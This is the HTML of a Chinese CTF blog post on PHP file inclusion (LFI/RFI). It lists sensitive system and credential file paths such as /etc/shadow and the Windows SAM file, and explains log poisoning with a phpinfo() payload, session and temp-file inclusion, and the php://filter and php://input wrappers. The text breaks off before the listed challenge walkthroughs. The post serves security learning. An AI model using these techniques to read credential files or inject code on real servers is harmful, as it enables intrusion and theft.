@@ -1,0 +1,1590 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>ctfshow_file_include - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="ctfshow_file_include" />
+<meta property="og:description" content="1 总结：文件包含漏洞全面详解
+php文件包含函数：
+1 2 3 4 require():找不到被包含的文件会产生致命错误，并停止脚本运行 include():找不到被包含的文件只会产生警告，脚本继续执行 require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 1.1 本地文件包含漏洞(LFI)1.1.1 常见敏感信息路径:Windows系统:
+C:\boot.ini //查看系统版本 C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件 C:\windows\repair\sam //存储Windows系统初次安装的密码 C:\ProgramFiles\mysql\my.ini //Mysql配置 C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码 C:\windows\php.ini //php配置信息 Linux/Unix系统:
+/etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 1.1.2 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。
+1.1.3 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。
+利用条件：
+对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知
+以直接访问的形式来写入如访问127.0.0.1&lt;?php phpinfo();?&gt;在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码
+1.1.4 包含Session文件利用条件：
+找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径:
+/var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径
+1.1.5 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。
+由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。
+1.2 远程文件包含(RFI)PHP的配置选项allow_url_include、allow_url_fopen状态为ON，则include/require函数是可以加载远程文件，在这种情况下可能产生RFI漏洞 可以来远程读取恶意webshell文件 截断方法：%00截断（php&lt;5." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/ctfshow_file_include/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="ctfshow_file_include"/>
+<meta name="twitter:description" content="1 总结：文件包含漏洞全面详解
+php文件包含函数：
+1 2 3 4 require():找不到被包含的文件会产生致命错误，并停止脚本运行 include():找不到被包含的文件只会产生警告，脚本继续执行 require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含 1.1 本地文件包含漏洞(LFI)1.1.1 常见敏感信息路径:Windows系统:
+C:\boot.ini //查看系统版本 C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件 C:\windows\repair\sam //存储Windows系统初次安装的密码 C:\ProgramFiles\mysql\my.ini //Mysql配置 C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码 C:\windows\php.ini //php配置信息 Linux/Unix系统:
+/etc/password //账户信息 /etc/shadow //账户密码信息 /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置 /usr/local/app/php5/lib/php.ini //PHP相关配置 /etc/httpd/conf/httpd.conf //Apache配置文件 /etc/my.conf //mysql配置文件 1.1.2 配合文件上传使用当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。
+1.1.3 包含Apache日志文件有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。
+利用条件：
+对日志文件可读 知道日志文件存储目录 一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知
+以直接访问的形式来写入如访问127.0.0.1&lt;?php phpinfo();?&gt;在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码
+1.1.4 包含Session文件利用条件：
+找到Session内的可控变量 Session文件可读写，并且知道存储路径 session常见存储路径:
+/var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。 我们也可以在phpinfo中看到session的保存路径
+1.1.5 包含临时文件php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。
+由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。
+1.2 远程文件包含(RFI)PHP的配置选项allow_url_include、allow_url_fopen状态为ON，则include/require函数是可以加载远程文件，在这种情况下可能产生RFI漏洞 可以来远程读取恶意webshell文件 截断方法：%00截断（php&lt;5."/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/ctfshow_file_include/" /><link rel="prev" href="http://scofield1920.github.io/ctfshow_file_upload/" /><link rel="next" href="http://scofield1920.github.io/ctfshow_deserialize/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ctfshow_file_include",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/ctfshow_file_include\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "CTF, web","wordcount":  1145 ,
+        "url": "http:\/\/scofield1920.github.io\/ctfshow_file_include\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#总结">总结：</a>
+      <ul>
+        <li><a href="#本地文件包含漏洞lfi">本地文件包含漏洞(LFI)</a>
+          <ul>
+            <li><a href="#常见敏感信息路径">常见敏感信息路径:</a></li>
+            <li><a href="#配合文件上传使用">配合文件上传使用</a></li>
+            <li><a href="#包含apache日志文件">包含Apache日志文件</a></li>
+            <li><a href="#包含session文件">包含Session文件</a></li>
+            <li><a href="#包含临时文件">包含临时文件</a></li>
+          </ul>
+        </li>
+        <li><a href="#远程文件包含rfi">远程文件包含(RFI)</a></li>
+        <li><a href="#php伪协议">PHP伪协议</a>
+          <ul>
+            <li><a href="#file协议">file://协议</a></li>
+            <li><a href="#php协议">php://协议</a></li>
+            <li><a href="#zip协议">ZIP://协议</a></li>
+            <li><a href="#data协议">data://协议</a></li>
+          </ul>
+        </li>
+        <li><a href="#伪协议利用条件">伪协议利用条件</a></li>
+        <li><a href="#文件包含漏洞防护">文件包含漏洞防护</a></li>
+      </ul>
+    </li>
+    <li><a href="#靶场题目">靶场题目：</a>
+      <ul>
+        <li><a href="#web78">[web78]</a></li>
+        <li><a href="#web79">[web79]</a></li>
+        <li><a href="#web80">[web80]</a></li>
+        <li><a href="#web81">[web81]</a></li>
+        <li><a href="#web82">[web82]</a></li>
+        <li><a href="#web83web86">[web83]~[web86]</a></li>
+        <li><a href="#web87">[web87]</a>
+          <ul>
+            <li><a href="#base64编码绕过">base64编码绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#web88">[web88]</a></li>
+        <li><a href="#web116">[web116]</a></li>
+        <li><a href="#web117">[web117]</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ctfshow_file_include</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Author</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1145 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#总结">总结：</a>
+      <ul>
+        <li><a href="#本地文件包含漏洞lfi">本地文件包含漏洞(LFI)</a>
+          <ul>
+            <li><a href="#常见敏感信息路径">常见敏感信息路径:</a></li>
+            <li><a href="#配合文件上传使用">配合文件上传使用</a></li>
+            <li><a href="#包含apache日志文件">包含Apache日志文件</a></li>
+            <li><a href="#包含session文件">包含Session文件</a></li>
+            <li><a href="#包含临时文件">包含临时文件</a></li>
+          </ul>
+        </li>
+        <li><a href="#远程文件包含rfi">远程文件包含(RFI)</a></li>
+        <li><a href="#php伪协议">PHP伪协议</a>
+          <ul>
+            <li><a href="#file协议">file://协议</a></li>
+            <li><a href="#php协议">php://协议</a></li>
+            <li><a href="#zip协议">ZIP://协议</a></li>
+            <li><a href="#data协议">data://协议</a></li>
+          </ul>
+        </li>
+        <li><a href="#伪协议利用条件">伪协议利用条件</a></li>
+        <li><a href="#文件包含漏洞防护">文件包含漏洞防护</a></li>
+      </ul>
+    </li>
+    <li><a href="#靶场题目">靶场题目：</a>
+      <ul>
+        <li><a href="#web78">[web78]</a></li>
+        <li><a href="#web79">[web79]</a></li>
+        <li><a href="#web80">[web80]</a></li>
+        <li><a href="#web81">[web81]</a></li>
+        <li><a href="#web82">[web82]</a></li>
+        <li><a href="#web83web86">[web83]~[web86]</a></li>
+        <li><a href="#web87">[web87]</a>
+          <ul>
+            <li><a href="#base64编码绕过">base64编码绕过</a></li>
+          </ul>
+        </li>
+        <li><a href="#web88">[web88]</a></li>
+        <li><a href="#web116">[web116]</a></li>
+        <li><a href="#web117">[web117]</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="总结" class="headerLink">
+    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>1 总结：</h2><p><a href="http://wed.xjx100.cn/news/39696.html?action=onClick" target="_blank" rel="noopener noreferrer">文件包含漏洞全面详解</a></p>
+<p>php文件包含函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require</span><span class="p">()</span><span class="o">:</span><span class="nx">找不到被包含的文件会产生致命错误，并停止脚本运行</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">()</span><span class="o">:</span><span class="nx">找不到被包含的文件只会产生警告，脚本继续执行</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">()</span><span class="nx">与require</span><span class="p">()</span><span class="nx">类似</span><span class="o">:</span><span class="nx">唯一的区别是如果该文件的代码已经被包含，则不会再次包含</span>
+</span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">()</span><span class="nx">与include</span><span class="p">()</span><span class="nx">类似</span><span class="o">:</span><span class="nx">唯一的区别是如果该文件的代码已经被包含，则不会再次包含</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="本地文件包含漏洞lfi" class="headerLink">
+    <a href="#%e6%9c%ac%e5%9c%b0%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9elfi" class="header-mark"></a>1.1 本地文件包含漏洞(LFI)</h3><h4 id="常见敏感信息路径" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%81%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e8%b7%af%e5%be%84" class="header-mark"></a>1.1.1 常见敏感信息路径:</h4><p><strong>Windows系统:</strong></p>
+<ul>
+<li>C:\boot.ini //查看系统版本</li>
+<li>C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件</li>
+<li>C:\windows\repair\sam //存储Windows系统初次安装的密码</li>
+<li>C:\ProgramFiles\mysql\my.ini //Mysql配置</li>
+<li>C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码</li>
+<li>C:\windows\php.ini //php配置信息</li>
+</ul>
+<p><strong>Linux/Unix系统:</strong></p>
+<ul>
+<li>/etc/password //账户信息</li>
+<li>/etc/shadow //账户密码信息</li>
+<li>/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件</li>
+<li>/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置</li>
+<li>/usr/local/app/php5/lib/php.ini //PHP相关配置</li>
+<li>/etc/httpd/conf/httpd.conf //Apache配置文件</li>
+<li>/etc/my.conf //mysql配置文件</li>
+</ul>
+<h4 id="配合文件上传使用" class="headerLink">
+    <a href="#%e9%85%8d%e5%90%88%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e4%bd%bf%e7%94%a8" class="header-mark"></a>1.1.2 配合文件上传使用</h4><p>当我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
+<h4 id="包含apache日志文件" class="headerLink">
+    <a href="#%e5%8c%85%e5%90%abapache%e6%97%a5%e5%bf%97%e6%96%87%e4%bb%b6" class="header-mark"></a>1.1.3 包含Apache日志文件</h4><p>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>对日志文件可读</li>
+<li>知道日志文件存储目录</li>
+</ul>
+<p>一般情况下日志储存目录会被修改，需要读取服务器配置文件（httpd.conf，nginx.conf等）或者根据phpinfo()中的信息来得知</p>
+<p>以直接访问的形式来写入如访问<code>127.0.0.1&lt;?php phpinfo();?&gt;</code>在日志文件中会被编码，我们可以通过抓包并修改掉被编码的字符来注入为编码的php代码</p>
+<h4 id="包含session文件" class="headerLink">
+    <a href="#%e5%8c%85%e5%90%absession%e6%96%87%e4%bb%b6" class="header-mark"></a>1.1.4 包含Session文件</h4><p><strong>利用条件：</strong></p>
+<ul>
+<li>找到Session内的可控变量</li>
+<li>Session文件可读写，并且知道存储路径</li>
+</ul>
+<p><strong>session常见存储路径:</strong></p>
+<ul>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/var/lib/php/sess_PHPSESSID</li>
+<li>/tmp/sess_PHPSESSID</li>
+<li>/tmp/sessions/sess_PHPSESSID</li>
+<li>session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。</li>
+</ul>
+<p>我们也可以在phpinfo中看到session的保存路径</p>
+<h4 id="包含临时文件" class="headerLink">
+    <a href="#%e5%8c%85%e5%90%ab%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6" class="header-mark"></a>1.1.5 包含临时文件</h4><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
+<h3 id="远程文件包含rfi" class="headerLink">
+    <a href="#%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%abrfi" class="header-mark"></a>1.2 远程文件包含(RFI)</h3><p>PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON，则<strong>include/require</strong>函数是可以加载远程文件，在这种情况下可能产生RFI漏洞
+<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725161516612.png" title="image-20230725161516612" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725161516612.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725161516612.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725161516612.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725161516612.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725161516612.png 2x"
+            sizes="auto"
+            alt="image-20230725161516612">
+    </a></figure></p>
+<p>可以来远程读取恶意webshell文件
+截断方法：<code>%00</code>截断（php&lt;5.3.4）、<code>?</code>截断（?后内容被视作GET传参）</p>
+<h3 id="php伪协议" class="headerLink">
+    <a href="#php%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="header-mark"></a>1.3 PHP伪协议</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162015173.png" title="image-20230725162015173" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162015173.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162015173.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162015173.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162015173.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162015173.png 2x"
+            sizes="auto"
+            alt="image-20230725162015173">
+    </a></figure></p>
+<h4 id="file协议" class="headerLink">
+    <a href="#file%e5%8d%8f%e8%ae%ae" class="header-mark"></a>1.3.1 file://协议</h4><p><strong>file://</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file:// [文件的绝对路径和文件名]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162159870.png" title="image-20230725162159870" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162159870.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162159870.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162159870.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162159870.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162159870.png 2x"
+            sizes="auto"
+            alt="image-20230725162159870">
+    </a></figure></p>
+<h4 id="php协议" class="headerLink">
+    <a href="#php%e5%8d%8f%e8%ae%ae" class="header-mark"></a>1.3.2 php://协议</h4><p>php:// 访问各个输入/输出流（I/O streams）
+在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>
+<strong>php://filter用于读取源码</strong>。
+<strong>php://input用于执行php代码</strong>。</p>
+<p><strong>php://filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
+<p><strong>利用条件:</strong></p>
+<ul>
+<li>allow_url_fopen ：off/on</li>
+<li>allow_url_include：off/on</li>
+</ul>
+<p>例如有些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码不会直接显示到页面上，则我们可以利用<code>php://filter/convert.base64-encode/resource=文件路径</code>来得到base64编码后的字符串，通过base64解码即可得到php完整源码</p>
+<p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。
+<strong>利用条件:</strong></p>
+<ul>
+<li>allow_url_fopen ：off/on</li>
+<li>allow_url_include：on</li>
+</ul>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162922591.png" title="image-20230725162922591" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162922591.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230725162922591.png"
